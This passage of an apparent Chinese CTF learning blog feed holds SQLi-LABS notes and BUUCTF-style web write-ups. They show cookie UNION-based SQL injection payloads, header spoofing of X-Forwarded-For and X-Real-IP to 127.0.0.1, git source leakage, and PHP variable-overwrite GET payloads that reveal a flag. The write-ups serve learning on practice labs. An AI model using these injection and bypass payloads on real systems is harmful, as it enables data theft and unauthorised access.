string</p></blockquote><p>登录账号admin，还挺酷的这界面2333：<br><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230705/St2iv8rimage.3t15tkaywee0.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cookee</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line"><span class="comment">//获取名为 uname 的 cookie 的值，并将其赋给变量 $cookee。</span></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">--------------------原形式--------------------</span><br><span class="line">SELECT * FROM users WHERE username=&#x27;$cookee&#x27; LIMIT 0,1</span><br><span class="line">--------------------插入Cookie--------------------</span><br><span class="line">uname=&#x27; union select user(),database(),version() #</span><br><span class="line">--------------------达成效果--------------------</span><br><span class="line">SELECT * FROM users WHERE </span><br><span class="line">username=&#x27;&#x27; union select user(),database(),version() #&#x27; LIMIT 0,1</span><br><span class="line">--------------------爆列内容--------------------</span><br><span class="line">uname=&#x27; union select group_concat(username,&#x27;--&#x27;),group_concat(username,&#x27;--&#x27;),3 from users #</span><br></pre></td></tr></table></figure><h1 id="第一阶段总结"><a href="#第一阶段总结" class="headerlink" title="第一阶段总结"></a>第一阶段总结</h1><p>​    Less-18/19/20 都得基于你已经有一个账号能够成功登录才能实现注入。</p><p>​    初步完成了<code>SQLi-LABS Page-1(Basic Challenges)</code>的内容，收获还是多多，但是还有些题目可能还有其他的解还没有钻研，但是<mark>先博而后约</mark>！今天美美在这里结束！</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASBOOK-Web</title>
      <link href="/2023/05/26/DASBOOK/"/>
      <url>/2023/05/26/DASBOOK/</url>
      
        <content type="html"><![CDATA[<blockquote><p>没有什么重头再来，凡走过的路都算数！(ง •_•)ง</p></blockquote><span id="more"></span><h2 id="0x0-极客大挑战-2019-Http"><a href="#0x0-极客大挑战-2019-Http" class="headerlink" title="0x0:[极客大挑战 2019]Http"></a>0x0:[极客大挑战 2019]Http</h2><p>​    查看网页源代码发现可疑连接：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.1rx0se1qmi9s.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># It doesn&#x27;t come from &#x27;https://Sycsecret.buuoj.cn&#x27;</span></span><br><span class="line"></span><br><span class="line">Referer: https://Sycsecret.buuoj.cn</span><br><span class="line"></span><br><span class="line"><span class="comment"># Please use &quot;Syclover&quot; browser</span></span><br><span class="line"></span><br><span class="line">User-Agent: Syclover</span><br><span class="line">    </span><br><span class="line"><span class="comment"># No!!! you can only read this locally!!!</span></span><br><span class="line"></span><br><span class="line">X-Forwarded-For: <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.71cfwppd5f40.png"></p><h2 id="0x1-BUU-BURP-COURSE-1"><a href="#0x1-BUU-BURP-COURSE-1" class="headerlink" title="0x1.BUU BURP COURSE 1"></a>0x1.BUU BURP COURSE 1</h2><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.33d2rrwg9aw0.png"></p><p>​    添加<code>X-Forwarded-For: 127.0.0.1</code> 请求头后无回显</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.6ikafb7k7600.png"></p><p>​    </p><p>更换为<code>X-Real-IP: 127.0.0.1</code>请求头：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.2bzqx0jnawsg.png"></p><p>查看源代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;zh-cn&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;text-align: center&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        用户名：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        密码：<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;wwoj2wio2jw93ey43eiuwdjnewkndjlwe&quot;</span>/&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;登录&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接登录会需要重新验证本地登录，使用<code>hackbar</code> Post方法从而实现登录：</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.2ro55t0t07y0.png"></p><blockquote><p>X-Forwarded-For是用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中</p><p>X-Real-IP，一般只记录真实发出请求的客户端IP</p></blockquote><p><a class="link" href="https://blog.csdn.net/weiyuefei/article/details/78687545">X-Forwarded-For 和 X-Real-IP 的区别<i class="fas fa-external-link-alt"></i></a></p><h2 id="0x2-BJDCTF2020-Mark-loves-cat"><a href="#0x2-BJDCTF2020-Mark-loves-cat" class="headerlink" title="0x2: [BJDCTF2020]Mark loves cat"></a>0x2: [BJDCTF2020]Mark loves cat</h2><h3 id="初探题目"><a href="#初探题目" class="headerlink" title="初探题目"></a>初探题目</h3><p>​    打开环境发现是一个还不错的博客网站，但是在末尾出现了一个与主题非常不符合的字符串<code>dog</code></p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.10lnttfn8er4.png"></p><p>​    日常用<code>dirsearch</code>扫一下</p><hr><p>​    这里后面补上，因为数据库项目所用的相应的库版本与dirsearch所需的库版本冲突，故先不使用dirsearch。</p><hr><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>​    dirsearch扫描后发现<code>/.git</code> 故存在git泄露漏洞。</p><p>​    使用<code>Githack</code>利用漏洞下载源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from flag.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$flag</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br></pre></td></tr></table></figure><p>​    这里放一点自己的小新路历程，因为我们发现了那串与网站很不符合的<code>dog</code>字符串在最末尾，所以我们直接翻到<code>index.php</code>的最后，果然发现了漏洞代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># from index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$yds</span> = <span class="string">&quot;dog&quot;</span>;</span><br><span class="line"><span class="variable">$is</span> = <span class="string">&quot;cat&quot;</span>;</span><br><span class="line"><span class="variable">$handsome</span> = <span class="string">&#x27;yds&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;the flag is: &quot;</span>.<span class="variable">$flag</span>;</span><br></pre></td></tr></table></figure><p>补充语法知识：</p><ol><li>php程序可以省略结束符号<code>?&gt;</code></li><li><a class="link" href="https://www.runoob.com/php/php-get.html">$_GET[‘flag’]<i class="fas fa-external-link-alt"></i></a></li><li><a class="link" href="https://www.runoob.com/php/php-post.html">$_POST[‘flag’]<i class="fas fa-external-link-alt"></i></a></li><li><a class="link" href="https://www.runoob.com/php/func-misc-exit.html">php中的exit函数<i class="fas fa-external-link-alt"></i></a>：exit(<em>message</em>)  输出一条消息，并退出当前脚本。</li></ol><p>​    先分析最简单的，这就是为什么开头我们会发现<code>dog</code>字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果既没有通过flag参数进行get和post传参就会直接exit并输出dog字符串</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    再分析<code>exit($is);</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 如果通过flag参数进行get或post传参传入的值是flag字符串的话就会直接exit并输出cat字符串</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.3omc7n0fpa60.png"></p><p>​    </p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.31l69b2libc0.png"></p><p>​    最后分析这个我认为最复杂的部分：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line"><span class="comment">//遍历$_GET数组中的键值对，检查如果GET参数flag的值等于某个键名，并且该键名不等于&quot;flag&quot;本身</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="variable">$x</span> &amp;&amp; <span class="variable">$x</span> !== <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    接下来我将举一个例子来更好地分析体会这串代码：</p><p>​    先进行get传参：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?flag=cs&amp;cs=1</span><br></pre></td></tr></table></figure><p>​    当使用GET方法传递参数<code>?flag=cs&amp;cs=1</code>时，<code>$_GET</code>数组中的键值对如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;cs&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cs&#x27;</span> =&gt; <span class="string">&#x27;1&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>​    此时遍历<code>$_GET数组</code>中的键值对<code>$_GET[&#39;flag&#39;]</code>的值为字符串<code>cs</code>，发现数组第二个元素可以满足<code>$_GET[&#39;flag&#39;] === $x</code>这个条件，即使此时的<code>$x</code>等于<code>cs</code>字符串，且<code>cs</code>字符串不等于<code>flag</code>字符串，故执行<code>exit($handsome)</code>，输出<code>ydx</code>并停止。</p><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.108gu5xmryq8.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>​    分析完相应漏洞代码后，我们该如何利用来输出flag呢？—–&gt;变量覆盖漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//遍历$_POST数组中的每个键值对，并将键名赋给变量$x，将对应的值赋给变量$y</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//遍历$_GET数组中的每个键值对，并将键名赋给变量$x，将对应的值赋给变量$y</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="语法补充：-x与-x的关系："><a href="#语法补充：-x与-x的关系：" class="headerlink" title="语法补充：$x与$$x的关系："></a>语法补充：<code>$x</code>与<code>$$x</code>的关系：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// $x 是一个变量，它保存着一个字符串值，该字符串是一个有效的变量名。</span></span><br><span class="line"><span class="comment">// $$x 则是使用 $x 的值作为变量名，即将变量名间接地确定为 $x 的值。</span></span><br><span class="line"><span class="variable">$x</span> = <span class="string">&#x27;cs&#x27;</span>;</span><br><span class="line"><span class="variable">$cs</span> = <span class="string">&#x27;28&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$x</span>;  <span class="comment">// --&gt;echo $cs ; --&gt; 输出：28</span></span><br></pre></td></tr></table></figure><h3 id="解法一：利用exit-handsome"><a href="#解法一：利用exit-handsome" class="headerlink" title="解法一：利用exit($handsome)"></a>解法一：利用exit($handsome)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?handsome=flag&amp;flag=handsome</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;handsome&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;handsome&#x27;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>​    经过如下代码后有：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$$y</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;handsome&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;handsome&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">第一次迭代：</span></span><br><span class="line"><span class="comment">$x = handsome , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $handsome , $$y = $flag</span></span><br><span class="line"><span class="comment">$handsome = $flag</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第二次迭代：</span></span><br><span class="line"><span class="comment">$x = flag , $y = handsome</span></span><br><span class="line"><span class="comment">$x = $flag , $y = $handsome</span></span><br><span class="line"><span class="comment">$flag = $handsome</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>​    在此之后，<code>$flag</code>与<code>$handsome</code>变量中的值均是<code>flag.php</code>文件中导入的值。此时刚好满足条件触发<code>exit($handsome)</code>输出<code>flag</code>的值。</p><h3 id="解法二：利用exit-yds"><a href="#解法二：利用exit-yds" class="headerlink" title="解法二：利用exit($yds)"></a>解法二：利用exit($yds)</h3><p>​    最简单的解法，原理与解法一相同。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;ydx&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">第一次迭代：</span></span><br><span class="line"><span class="comment">$x = ydx , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $ydx , $$y = $flag</span></span><br><span class="line"><span class="comment">$ydx = $flag</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.35tp06u455s0.png"></p><h3 id="解法三：利用exit-is"><a href="#解法三：利用exit-is" class="headerlink" title="解法三：利用exit($is)"></a>解法三：利用exit($is)</h3><blockquote><p>​    最开始没细看以为Post方法会有不同的方式利用，没想到Post方法只能实现修改一个变量的内容的功能，所以这里还是使用Get方法获取flag.</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    <span class="variable">$$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>  || <span class="variable">$_GET</span>[<span class="string">&#x27;flag&#x27;</span>] === <span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="variable">$is</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    在这里如果要利用<code>exit($is)</code>就需要使用<code>Post方法</code>且有一项必须为<code>flag=flag</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_POST</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is&#x27;</span> =&gt; <span class="string">&#x27;你猜猜我会输出啥？&#x27;</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">第一次迭代：</span></span><br><span class="line"><span class="comment">$x = flag , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $flag , $y = flag</span></span><br><span class="line"><span class="comment">$flag = flag</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第二次迭代：</span></span><br><span class="line"><span class="comment">$x = is , $y = 你猜猜我会输出啥？</span></span><br><span class="line"><span class="comment">$$x= $is , $y = 你猜猜我会输出啥？</span></span><br><span class="line"><span class="comment">$is = 你猜猜我会输出啥？</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.qwaut6rp6v.png"></p><p>​    既然做不到变量名代替，现在我们来深入思考该怎么实现将flag中的内容赋给is变量呢？<br>​    经过进一步分析发现，利用Post方法只能做到修改一个变量的内容，而不能实现变量名替换从而输出flag，所以这里还是得利用get方法！</p><p>​    </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_GET</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&#x27;is&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;flag&#x27;</span> =&gt; <span class="string">&#x27;flag&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">第一次迭代：</span></span><br><span class="line"><span class="comment">$x = is , $y = flag</span></span><br><span class="line"><span class="comment">$$x= $is , $$y = $flag</span></span><br><span class="line"><span class="comment">$is = $flag</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">第二次迭代：---&gt;满足if条件</span></span><br><span class="line"><span class="comment">$x = flag , $y = flag</span></span><br><span class="line"><span class="comment">$x = $flag , $y = $flag</span></span><br><span class="line"><span class="comment">$flag = $flag</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p><img lazyload alt="image" data-src="https://cdn.staticaly.com/gh/C2yb8er/picx-images-hosting@master/20230526/St2iv8rimage.652gus4ywpk0.png"></p><h3 id="解法四-利用echo-quot-the-flag-is-quot-flag"><a href="#解法四-利用echo-quot-the-flag-is-quot-flag" class="headerlink" title="解法四: 利用echo &quot;the flag is: &quot;.$flag;"></a>解法四: 利用<code>echo &quot;the flag is: &quot;.$flag;</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?1=flag&amp;flag=1</span><br></pre></td></tr></table></figure><p><img lazyload alt="image" 